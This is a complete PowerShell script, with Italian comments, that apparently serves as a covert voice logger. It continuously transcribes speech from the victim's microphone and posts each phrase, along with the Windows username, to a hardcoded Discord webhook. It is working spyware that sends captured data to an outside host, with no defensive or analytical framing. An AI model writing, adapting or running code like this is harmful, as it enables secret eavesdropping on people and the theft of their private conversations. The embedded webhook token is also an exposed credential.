function DC-Upload {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$text
    )

    # Il tuo Webhook Discord
    $dc = 'https://discord.com/api/webhooks/1370038152143831101/iN2bRBDfDdvTBDEk0ElyeUlObFuw8zmflue_XbZkaTYUL8rH87ZYvwozegioJSkj-um2'

    $Body = @{
        'username' = $env:username
        'content'  = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc -Method Post -Body ($Body | ConvertTo-Json)
    }
}

function voiceLogger {
    Add-Type -AssemblyName System.Speech
    $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
    $grammar = New-Object System.Speech.Recognition.DictationGrammar
    $recognizer.LoadGrammar($grammar)
    $recognizer.SetInputToDefaultAudioDevice()

    while ($true) {
        $result = $recognizer.Recognize()
        if ($result) {
            $results = $result.Text
            Write-Output $results
            $log = "$env:tmp/VoiceLog.txt"
            echo $results > $log
            $text = get-content $log -raw
            DC-Upload $text

            # Usa una dichiarazione switch con la variabile $results
            switch -regex ($results) {
                '\bnote\b' {saps notepad}  # Se il comando è 'note', apri il notepad
                '\bexit\b' {break}          # Se il comando è 'exit', esci dal ciclo
            }
        }
    }
    Clear-Content -Path $log
}

voiceLogger
